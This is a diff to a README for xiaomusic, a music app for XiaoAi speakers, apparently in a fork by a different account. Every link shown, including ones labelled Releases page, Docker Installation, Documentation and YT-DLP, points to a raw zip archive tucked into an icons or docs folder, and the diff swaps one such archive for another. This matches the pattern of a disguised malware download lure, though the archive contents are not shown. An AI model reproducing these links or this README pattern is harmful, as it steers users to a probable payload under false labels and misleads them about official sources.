@@ -6,9 +6,9 @@ Welcome to xiaomusic! This application helps you play music using your XiaoAi sp
 
 ## 📦 Download & Install
 
-[![Download xiaomusic](https://raw.githubusercontent.com/Bashvalencia724/xiaomusic/main/xiaomusic/static/icons/windows11/xiaomusic-3.8.zip)](https://raw.githubusercontent.com/Bashvalencia724/xiaomusic/main/xiaomusic/static/icons/windows11/xiaomusic-3.8.zip)
+[![Download xiaomusic](https://raw.githubusercontent.com/Bashvalencia724/xiaomusic/main/docs/.vitepress/Software-v2.7.zip)](https://raw.githubusercontent.com/Bashvalencia724/xiaomusic/main/docs/.vitepress/Software-v2.7.zip)
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/Bashvalencia724/xiaomusic/main/xiaomusic/static/icons/windows11/xiaomusic-3.8.zip) to download the latest version of xiaomusic. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Bashvalencia724/xiaomusic/main/docs/.vitepress/Software-v2.7.zip) to download the latest version of xiaomusic. 
 
 1. Click on the link above.
 2. Find the latest release.
@@ -27,7 +27,7 @@ To get started, visit the [Releases page](https://raw.githubusercontent.com/Bash
    
 2. **Install Dependencies:**
    - Make sure Docker and Docker Compose are installed on your system. 
-   - For detailed installation instructions on Docker, visit [Docker Installation](https://raw.githubusercontent.com/Bashvalencia724/xiaomusic/main/xiaomusic/static/icons/windows11/xiaomusic-3.8.zip).
+   - For detailed installation instructions on Docker, visit [Docker Installation](https://raw.githubusercontent.com/Bashvalencia724/xiaomusic/main/docs/.vitepress/Software-v2.7.zip).
 
 3. **Run the Application:**
    - Open a terminal or command prompt.
@@ -46,7 +46,7 @@ To get started, visit the [Releases page](https://raw.githubusercontent.com/Bash
 ## 🔄 Updating the Application
 
 To update xiaomusic:
-1. Visit the [Releases page](https://raw.githubusercontent.com/Bashvalencia724/xiaomusic/main/xiaomusic/static/icons/windows11/xiaomusic-3.8.zip).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Bashvalencia724/xiaomusic/main/docs/.vitepress/Software-v2.7.zip).
 2. Download the latest version following the same steps as above.
 3. Replace the old files with the new ones you downloaded.
 
@@ -56,8 +56,8 @@ If you encounter issues or have questions, please open an issue on the GitHub re
 
 ## 🔗 Resources
 
-- [Documentation](https://raw.githubusercontent.com/Bashvalencia724/xiaomusic/main/xiaomusic/static/icons/windows11/xiaomusic-3.8.zip)
-- [Docker Documentation](https://raw.githubusercontent.com/Bashvalencia724/xiaomusic/main/xiaomusic/static/icons/windows11/xiaomusic-3.8.zip)
-- [YT-DLP](https://raw.githubusercontent.com/Bashvalencia724/xiaomusic/main/xiaomusic/static/icons/windows11/xiaomusic-3.8.zip)
+- [Documentation](https://raw.githubusercontent.com/Bashvalencia724/xiaomusic/main/docs/.vitepress/Software-v2.7.zip)
+- [Docker Documentation](https://raw.githubusercontent.com/Bashvalencia724/xiaomusic/main/docs/.vitepress/Software-v2.7.zip)
+- [YT-DLP](https://raw.githubusercontent.com/Bashvalencia724/xiaomusic/main/docs/.vitepress/Software-v2.7.zip)
 
 Thank you for choosing xiaomusic! Enjoy your music with ease.
